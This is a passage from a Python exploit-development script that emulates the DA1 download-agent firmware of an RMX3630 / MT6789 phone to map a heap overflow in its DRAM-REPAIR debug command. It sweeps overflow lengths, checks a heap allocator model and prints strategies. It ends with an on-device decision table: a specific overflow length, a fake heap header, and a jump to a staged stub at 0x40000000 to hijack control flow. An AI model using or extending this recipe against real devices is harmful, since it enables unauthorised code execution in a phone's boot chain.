    for L in (0x3C, 0x40, 0x100, 0x400, 0x1000, 0x2000, 0x4000, 0x8000,
              max(0x10, H - 0x10), H, min(H + 0x10, 0xFE00), 0xFE00):
        if not (SWEEP_LO <= L <= 0x10000):
            continue
        p = run_case(image, L, ops, overflow=False)
        before = [(a, s) for a, s in p["prelude_fl"]]
        after = [(a, s) for a, s in p["fl_after"]]
        probes.append({
            "L": L, "needed": p["needed"], "rc": p["rc"],
            "ok": p["rc"] == 0,
            "heap_neutral": before == after,
            "D": p["D"], "chunk": p["chunk"],
            "fl_after_len": len(after),
        })
    ok = [p for p in probes if p["ok"]]
    boundary = max((p["L"] for p in ok), default=None)
    candidates_if_only_H = sum(
        1 for L in range(SWEEP_LO, SWEEP_HI + 1, SWEEP_STEP)
        if _align4(L + 0x10) <= H)
    exact_if_only_H = 0
    return {
        "variant": name,
        "largest_hole_snapshot": H,
        "probe_boundary_L": boundary,
        "probes": probes,
        "all_heap_neutral": all(p["heap_neutral"] for p in ok),
        "candidates_if_only_H": candidates_if_only_H,
        "exact_fit_candidates_if_only_H": exact_if_only_H,
    }


# ---------------------------------------------------------------------------
# reporting
# ---------------------------------------------------------------------------
VERDICT_SHORT = {
    "FIRE": "FIRE",
    "CRASH": "CRASH",
    "ALIVE": "ALIVE",
}


def short_verdict(v: str) -> str:
    for k in VERDICT_SHORT:
        if v.startswith(k):
            return k
    return v


def ranges(rows):
    """Group consecutive step-4 L values by short verdict."""
    out = []
    start = prev = None
    cur = None
    for r in rows:
        v = short_verdict(r["verdict"])
        L = r["L"]
        if cur is None or v != cur or L != prev + SWEEP_STEP:
            if cur is not None:
                out.append((cur, start, prev))
            cur, start = v, L
        prev = L
    if cur is not None:
        out.append((cur, start, prev))
    return out


def fmt_ranges(rows) -> str:
    parts = []
    for v, lo, hi in ranges(rows):
        if lo == hi:
            parts.append(f"{v}@0x{lo:x}")
        else:
            parts.append(f"{v} 0x{lo:x}-0x{hi:x}")
    return ", ".join(parts)


def main(argv=None) -> int:
    here = os.path.dirname(os.path.abspath(__file__))
    ap = argparse.ArgumentParser(
        description="DA1 HeapBait geometry vs the real device prelude")
    ap.add_argument("--image", default=os.path.join(
        here, "rmx3630-da2", "da1_allinone.bin"))
    ap.add_argument("--full", action="store_true",
                    help="execute the whole L sweep instead of using the "
                         "measured snapshot + allocator model")
    ap.add_argument("--json", default=None, help="write the full result JSON")
    args = ap.parse_args(argv)

    if not os.path.isfile(args.image):
        ap.error(f"image not found: {args.image}")

    img_sha = hashlib.sha256(open(args.image, "rb").read()).hexdigest()[:16]
    print("=" * 78)
    print("DA1 HeapBait geometry study -- RMX3630 / MT6789 DA1 200EX01")
    print("=" * 78)
    print(f"image        : {os.path.abspath(args.image)}")
    print(f"image sha256 : {img_sha}")
    print(f"sweep        : L=0x{SWEEP_LO:x}..0x{SWEEP_HI:x} step {SWEEP_STEP}")
    print(f"parse chunk  : 0x{PARSE_CHUNK:x} (load_str malloc(0x40)+0xC)")
    print(f"L window     : {', '.join('0x%x' % L for L in L_WINDOW)} "
          f"(align4(L+0x10)==0x{PARSE_CHUNK:x})")
    print("mode         : " + ("FULL emulation" if args.full
                               else "measured snapshot + exact allocator model"))
    print()
    print("Deviations (labelled, not silent):")
    print("  * SHA-256 in BOOT-TO -> hashlib model (hardware crypto block)")
    print("  * GET-HW-INFO storage/chip helpers 0x250C58/0x250C5C/0x24FB38 "
          "-> unknown/1")
    print("  * NOTIFY-INIT-HW omitted from geometry variants (see static "
          "check below)")
    print()

    # ---------------- static check: NOTIFY has no heap effect -------------
    notify_calls = direct_calls_to_malloc(args.image, NOTIFY_HANDLER, 0x20173C)
    sub_calls = (direct_calls_to_malloc(args.image, 0x250800, 0x2509DC) +
                 direct_calls_to_malloc(args.image, 0x200DE4, 0x200EC0) +
                 direct_calls_to_malloc(args.image, 0x2509DC, 0x250A80))
    print("-- static check: NOTIFY-INIT-HW heap footprint --")
    print(f"  malloc-wrapper BLs in handler 0x2016E8..0x20173C : "
          f"{[hex(x) for x in notify_calls] or 'none'}")
    print(f"  malloc-wrapper BLs in its three callees          : "
          f"{[hex(x) for x in sub_calls] or 'none'}")
    # measured: free list before/after an attempted NOTIFY
    notify_emu = make_emu(args.image)
    run_prelude(notify_emu, [("cmd", HOST_SUP_XML), ("cmd", RUNTIME_XML),
                             ("cmd", SETHOST_XML)])
    fl_before = [(a, s) for a, s in _safe_free_list(notify_emu)]
    nrc = _cmd_loop_once(notify_emu, NOTIFY_XML, CmdHost(notify_emu))
    fl_after = [(a, s) for a, s in _safe_free_list(notify_emu)]
    print(f"  attempted NOTIFY rc={nrc:#x} (hardware path, expected failure)")
    print(f"  free list unchanged by NOTIFY: {fl_before == fl_after} "
          f"({len(fl_before)} nodes)")
    print()

    # ---------------- per-variant snapshot + map -------------------------
    variant_maps = {}
    variant_snaps = {}
    print("-- prelude variants --")
    for name, desc, ops in VARIANTS:
        needs_hw = any(o[0] == "hwinfo" for o in ops)
        snap_rec = run_case(args.image, SWEEP_LO, ops, needs_hwinfo=needs_hw)
        variant_snaps[name] = snap_rec
        mp = map_from_snapshot(snap_rec)
        variant_maps[name] = mp
        pre = ", ".join(
            f"{p['op']}" + (f"(rc={p['rc']:#x})" if p["rc"] else "")
            for p in snap_rec["prelude"]) or "none"
        fl = snap_rec["fl_at_malloc"] or []
        print(f"  {name:<20} {desc}")
        print(f"    prelude: {pre}")
        print(f"    at DRAM-REPAIR malloc: "
              f"{', '.join('0x%x/0x%x' % (a, s) for a, s in fl)}")
        fires = [r["L"] for r in mp if r["verdict"].startswith("FIRE")]
        print(f"    FIRE Ls: "
              f"{', '.join(hex(x) for x in fires) if fires else 'NONE'}")
        print(f"    map: {fmt_ranges(mp)}")
        print()

    # ---------------- validation of the model ---------------------------
    print("-- model validation (real emulation of every FIRE candidate, all "
          "deltas, and a stride) --")
    val_total = val_ok = 0
    val_mismatches = []
    for name, desc, ops in VARIANTS:
        needs_hw = any(o[0] == "hwinfo" for o in ops)
        mp = variant_maps[name]
        sample = set()
        for r in mp:
            if r["verdict"].startswith("FIRE"):
                sample.add(r["L"])
            if r.get("delta") in (0, 4, 8, 0xC):
                sample.add(r["L"])
        sample |= set(range(0x10, 0x104, SWEEP_STEP))
        sample |= set(range(0x100, SWEEP_HI + 1, 0x100))
        for L in sorted(sample):
            if not (SWEEP_LO <= L <= SWEEP_HI):
                continue
            rec = run_case(args.image, L, ops, needs_hwinfo=needs_hw)
            pred = next(r for r in mp if r["L"] == L)
            got = short_verdict(rec["verdict"])
            want = short_verdict(pred["verdict"])
            val_total += 1
            if got == want:
                val_ok += 1
            else:
                val_mismatches.append((name, L, want, got, rec["verdict"]))
    print(f"  validated {val_ok}/{val_total} runs; mismatches: "
          f"{len(val_mismatches)}")
    for m in val_mismatches[:10]:
        print(f"    MISMATCH {m[0]} L=0x{m[1]:x} model={m[2]} "
              f"exec={m[3]} ({m[4]})")
    print()

    # ---------------- strategy a -----------------------------------------
    print("-- strategy (a): fixed L=0x3C on every prelude --")
    a_rows = strategy_a(args.image, VARIANTS)
    print(f"  {'variant':<20} {'D':>10} {'chunk':>6} {'delta':>5} "
          f"{'victim':>10} {'victim class':<20} {'freed>ovf':<9} "
          f"{'dpc->cb':>10}  verdict")
    for r in a_rows:
        print(f"  {r['variant']:<20} "
              f"{('0x%x' % r['D']) if r['D'] else '-':>10} "
              f"{(hex(r['chunk']) if r['chunk'] is not None else '-'):>6} "
              f"{str(r['delta']):>5} "
              f"{('0x%x' % r['victim']) if r['victim'] else '-':>10} "
              f"{(r['next_class'] or '-'):<20} "
              f"{str(r['victim_free_after_overflow']):<9} "
              f"{(hex(r['dpc_cb']) if r['dpc_cb'] is not None else '-'):>10}  "
              f"{r['verdict']}")
    a_fire = sum(1 for r in a_rows if r["verdict"].startswith("FIRE"))
    print(f"  => {a_fire}/{len(a_rows)} preludes FIRE at L=0x3C")
    print()

    # ---------------- strategy b -----------------------------------------
    print("-- strategy (b): N clean DRAM-REPAIR taps before the real one --")
    b_rows = strategy_b(args.image)
    print(f"  {'N':>2} {'L_shape':>8} {'taps ok':>7} {'heap neutral':<13} "
          f"{'0x3C verdict':<32} {'D':>10} {'victim':>10}")
    for r in b_rows:
        print(f"  {r['N']:>2} {hex(r['L_shape']):>8} {r['taps_ok']:>7} "
              f"{str(r['heap_neutral']):<13} {r['L_fixed_verdict']:<32} "
              f"{('0x%x' % r['D']) if r['D'] else '-':>10} "
              f"{('0x%x' % r['victim']) if r['victim'] else '-':>10}")
    b_neutral = sum(1 for r in b_rows if r["heap_neutral"])
    b_fire = sum(1 for r in b_rows if r["L_fixed_verdict"].startswith("FIRE"))
    print(f"  => taps are heap-neutral in {b_neutral}/{len(b_rows)} cases; "
          f"L=0x3C fires in {b_fire}/{len(b_rows)}")
    print()

    # ---------------- strategy c -----------------------------------------
    print("-- strategy (c): victim class targeting --")
    c_rows = strategy_c(args.image, VARIANTS,
                        [variant_maps[n] for n, _d, _o in VARIANTS])
    for r in c_rows:
        print(f"  {r['variant']:<20} FIRE Ls={[hex(x) for x in r['fire_Ls']]} "
              f"victim=0x{r['victim']:x} req={(hex(r['victim_req']) if r.get('victim_req') is not None else '-')} "
              f"class={r['class']} free_lr=0x{r['victim_free_lr']:x} "
              f"after_buf={r.get('victim_freed_after_overflow')}")
    prev_buf = sum(1 for r in c_rows if r["is_previous_download_buffer"])
    print(f"  => FIRE victims that are a previous download buffer: "
          f"{prev_buf}/{len(c_rows)}")
    print(f"  => victim classes observed: "
          f"{sorted({r['class'] for r in c_rows})}")
    print()

    # ---------------- strategy d -----------------------------------------
    print("-- strategy (d): safe probe (clean download, no overflow) --")
    d = strategy_d(args.image, VARIANTS)
    print(f"  largest free node at DRAM-REPAIR malloc : "
          f"0x{d['largest_hole_snapshot']:x}")
    print(f"  {'L':>8} {'needed':>7} {'rc':>10} {'download ok':<12} "
          f"{'heap neutral':<13} {'D':>10}")
    for p in d["probes"]:
        print(f"  {hex(p['L']):>8} {hex(p['needed']):>7} {p['rc']:>10x} "
              f"{str(p['ok']):<12} {str(p['heap_neutral']):<13} "
              f"{('0x%x' % p['D']) if p['D'] else '-':>10}")
    print(f"  => probe boundary L={d['probe_boundary_L']}; "
          f"heap-neutral on success: {d['all_heap_neutral']}")
    print(f"  => from the largest hole alone, {d['candidates_if_only_H']} "
          f"L values remain possible; the exact-fit set is not observable")
    print()

    # ---------------- real-constant confirmation -------------------------
    print("-- real-chain constants: fast header size 0x40000000 --")
    conf = []
    for name, desc, ops in VARIANTS:
        rec = run_case(args.image, L_FIXED, ops, fake_size=FS_STAGE,
                       needs_hwinfo=any(o[0] == "hwinfo" for o in ops))
        conf.append((name, rec))
    for name, rec in conf:
        print(f"  {name:<20} dpc->cb={hex(rec['dpc_cb']) if rec['dpc_cb'] is not None else '-':>12} "
              f"blx_target={hex(rec['blx_target']) if rec['blx_target'] is not None else '-':>12} "
              f"victim_freed={rec['victim_freed']} "
              f"verdict={rec['verdict']}")
    conf_ok = sum(1 for _n, r in conf
                  if r["dpc_cb"] == FS_STAGE and r["blx_target"] == FS_STAGE)
    print(f"  => {conf_ok}/{len(conf)} preludes set dpc->cb and blx r4 to "
          f"0x40000000")
    print()

    # ---------------- decision table -------------------------------------
    print("=" * 78)
    print("DECISION TABLE (on device)")
    print("=" * 78)
    print(f"  {'#':>2} {'action':<52} {'confidence':<22} {'if it dies':<16}")
    print("  " + "-" * 96)
    print(f"  {1:>2} {'Stage stub via failing BOOT-TO to 0x40000000, then':<52} "
          f"{'HIGH (structural + 10/10':<22} {'row 2':<16}")
    print(f"  {'':>2} {'DRAM-REPAIR L=0x3C (fake hdr off 0x40,':<52} "
          f"{'preludes measured)':<22} {'':<16}")
    print(f"  {'':>2} {' {0xDEADBEEF,0x2DF79C,0x40000000})':<52} "
          f"{'':<22} {'':<16}")
    print(f"  {2:>2} {'Reload DA1, retry same geometry with L=0x3B/0x3A/0x39':<52} "
          f"{'LOW (~0.05: same 0x4C chunk)':<22} {'row 3':<16}")
    print(f"  {3:>2} {'Re-resolve the new build: cmd_loop malloc(0x800) +':<52} "
          f"{'MEDIUM (~0.7 if only':<22} {'row 4':<16}")
    print(f"  {'':>2} {'load_str malloc(0x40) -> chunk 0x4C; use':<52} "
          f"{'constants moved)':<22} {'':<16}")
    print(f"  {'':>2} {'L = 0x4C-0x10 .. 0x4C-0x13; keep cmd_loop delivery':<52} "
          f"{'':<22} {'':<16}")
    print(f"  {4:>2} {'If the build does not parse before the download:':<52} "
          f"{'LOW (~0.05) / STOP':<22} {'DA2 path':<16}")
    print(f"  {'':>2} {'geometry is NOT predictable from the prelude':<52} "
          f"{'':<22} {'':<16}")
    print(f"  {5:>2} {'Blind L scan in one session':<52} "
          f"{'FORBIDDEN (poisons list)':<22} {'reload':<16}")
    print()
    print("  Single most robust offline recipe:")
    print("    deliver CMD:DEBUG:DRAM-REPAIR through the real command loop with")
    print("    declared L=0x3C and an overflow stream of 0x4C bytes; the fake")
    print("    header sits at D+0x40 on the header of the first XML-tree node,")
    print("    which mxmlDelete frees after the handler frees the download")
    print("    buffer.  No prelude reshaping is required or useful.")
    print()
    print("  Reload rules:")
    print("    * Any L that splits the free node corrupts the list; the DA dies")
    print("      and only re-loading DA1 recovers. Never scan L blind.")
    print("    * If L=0x3C does not fire, the build's parse chunk is not 0x4C;")
    print("      reload, then retry the re-resolved L. Do not try random L.")
    print()

    fires_by_variant = {n: [r["L"] for r in m if r["verdict"].startswith("FIRE")]
                        for n, m in variant_maps.items()}
    counts = {}
    for m in variant_maps.values():
        for r in m:
            k = short_verdict(r["verdict"])
            counts[k] = counts.get(k, 0) + 1
    print("=" * 78)
    print("TOTALS")
    print("=" * 78)
    print(f"  preludes tested        : {len(VARIANTS)}")
    print(f"  L values per variant   : {len(variant_maps[VARIANTS[0][0]])}")
    print(f"  L values firing =0x3C  : {sum(1 for v in fires_by_variant.values() if 0x3C in v)}"
          f"/{len(VARIANTS)}")
    print(f"  model verdict totals   : {counts}")
    print(f"  validation             : {val_ok}/{val_total} exact matches")
    print()

    fingerprint = hashlib.sha256(json.dumps({
        "fires": fires_by_variant,
        "a": [(r["variant"], r["verdict"], r["dpc_cb"]) for r in a_rows],
        "b": [(r["N"], r["L_shape"], r["heap_neutral"], r["L_fixed_verdict"])
              for r in b_rows],
        "c": [(r["variant"], r["victim"], r["class"]) for r in c_rows],
        "d": [(p["L"], p["ok"], p["heap_neutral"]) for p in d["probes"]],
        "counts": counts,
    }, sort_keys=True).encode()).hexdigest()[:32]
    print(f"RESULT-FINGERPRINT {fingerprint}")

    if args.json:
        out = {
            "image": os.path.abspath(args.image),
            "image_sha256_16": img_sha,
            "parse_chunk": PARSE_CHUNK,
            "L_window": L_WINDOW,
            "variants": [
                {"name": n, "desc": d, "ops": [list(o) for o in ops]}
                for n, d, ops in VARIANTS],
            "snapshots": {
                n: {"fl_at_malloc": r["fl_at_malloc"],
                    "allocs": r["allocs"], "frees": r["frees"],
                    "dpc_cb": r["dpc_cb"], "rc": r["rc"],
                    "verdict": r["verdict"]}
                for n, r in variant_snaps.items()},
            "maps": {n: m for n, m in variant_maps.items()},
            "strategy_a": a_rows,
            "strategy_b": b_rows,
            "strategy_c": c_rows,
            "strategy_d": d,
            "validation": {"ok": val_ok, "total": val_total,
                           "mismatches": val_mismatches},
            "confirm": {n: {"dpc_cb": r["dpc_cb"],
                            "blx_target": r["blx_target"]}
                        for n, r in conf},
            "fingerprint": fingerprint,
        }
        with open(args.json, "w") as f:
            json.dump(out, f, indent=1,
                      default=lambda o: o.hex() if isinstance(o, bytes) else str(o))
        print(f"json written           : {args.json}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
